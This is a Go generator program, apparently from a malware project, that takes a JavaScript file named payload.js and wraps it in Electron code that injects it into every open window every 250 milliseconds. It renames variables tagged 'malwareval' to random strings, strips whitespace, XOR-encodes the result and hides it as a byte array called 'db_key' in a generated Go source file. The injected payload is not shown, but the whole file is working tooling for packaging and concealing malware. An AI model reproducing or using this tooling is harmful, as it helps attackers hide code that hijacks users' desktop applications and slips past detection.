//go:build ignore

package main

import (
	"fmt"
	"go/format"
	"io"
	"log"
	"math/rand"
	"os"
	"regexp"
	"strings"
)

var (
	FileHeader = `// This file was generated by go generate; DO NOT EDIT
package %s
`
)
var replacer = strings.NewReplacer(
	"    ", "",
	"\r\n", "",
	"\n", "",
)
var malwareValRegex = regexp.MustCompile(`(?i)((?:let |\()(malwareval[a-z0-9]*)(?:;| ?=|\) ?=>))`)
var letterRunes = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ")
var executionInterval = 250

var payloadHeading = `const { BrowserWindow } = require("electron");
setInterval(() => {
    BrowserWindow.getAllWindows().forEach((window) => {
        window.webContents.executeJavaScript(` + "`"
var payloadFooter = "`" + `);
});
}, ` + fmt.Sprint(executionInterval) + `);`

func xor(k, s string) (o string) {
	for i := 0; i < len(s); i++ {
		o += string(s[i] ^ k[i%len(k)])
	}
	return o
}

func main() {
	file, err := os.Open("./payload.js")
	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("Reading payload file...")
	fileBody, err := io.ReadAll(file)
	if err != nil {
		fmt.Println(err)
		return
	}
	body := formatPayload(string(fileBody))

	w, err := os.Create("formattedpayload.js")
	if err != nil {
		fmt.Printf("Could not create file formattedpayload.js: %v\n", err)
		return
	}
	defer w.Close()

	if _, err := w.Write([]byte(body)); err != nil {
		fmt.Printf("Error writing file formattedpayload.js: %v\n", err)
		return
	}

	var encoded = xor("index.js", body)

	var chars = []string{}

	for _, rune := range encoded {
		code := fmt.Sprintf("0x%X", string(rune)[0])
		chars = append(chars, code)
	}

	var content = fmt.Sprintf("var db_key = []rune{%s}", strings.Join(chars, ", "))

	WriteGoFile("lol.go", "main", []byte(content))
}

func formatPayload(payload string) string {
	payload = payloadHeading + payload + payloadFooter

	matches := malwareValRegex.FindAllStringSubmatch(payload, -1)
	if matches != nil {
		for _, match := range matches {
			variable := match[2]
			newVariable := RandString(8)
			payload = strings.ReplaceAll(payload, variable, newVariable)
			fmt.Printf("Replaced %s with %s\n", variable, newVariable)
		}
	}

	payload = replacer.Replace(payload)
	fmt.Println("Removed whitespace")

	fmt.Println("Formatted payload")
	return payload
}

func RandString(n int) string {
	b := make([]rune, n)
	for i := range b {
		b[i] = letterRunes[rand.Intn(len(letterRunes))]
	}
	return string(b)
}

func WriteGoFile(filename, pkg string, b []byte) {
	w, err := os.Create(filename)
	if err != nil {
		log.Fatalf("Could not create file %s: %v", filename, err)
	}
	defer w.Close()

	_, err = fmt.Fprintf(w, FileHeader, pkg)
	if err != nil {
		log.Fatalf("Error writing header: %v", err)
	}

	// Strip leading newlines.
	for len(b) > 0 && b[0] == '\n' {
		b = b[1:]
	}
	formatted, err := format.Source(b)

	if err != nil {
		// Print the original buffer even in case of an error so that the
		// returned error can be meaningfully interpreted.
		w.Write(b)
		log.Fatalf("Error formatting file %s: %v", filename, err)
	}

	if _, err := w.Write(formatted); err != nil {
		log.Fatalf("Error writing file %s: %v", filename, err)
	}

	fmt.Printf("Wrote payload content to %s\n", filename)
}
